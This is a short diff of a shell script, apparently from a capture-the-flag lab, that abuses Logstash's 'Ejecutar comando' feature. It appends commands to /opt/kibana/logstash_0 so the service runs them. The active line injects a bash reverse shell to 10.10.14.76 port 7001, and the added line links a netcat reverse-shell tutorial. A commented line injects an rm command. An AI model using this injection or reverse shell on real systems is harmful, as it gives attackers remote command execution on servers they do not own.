@@ -95,6 +95,7 @@ logs      : /var/log/logstash
 #echo "Ejecutar comando : rm /tmp/.test.txt" >> /opt/kibana/logstash_0
 
 # need to reverse shell
+# https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
 # bash -i >& /dev/tcp/ip/port 0>&1
 echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.76/7001 0>&1" >> /opt/kibana/logstash_0
 
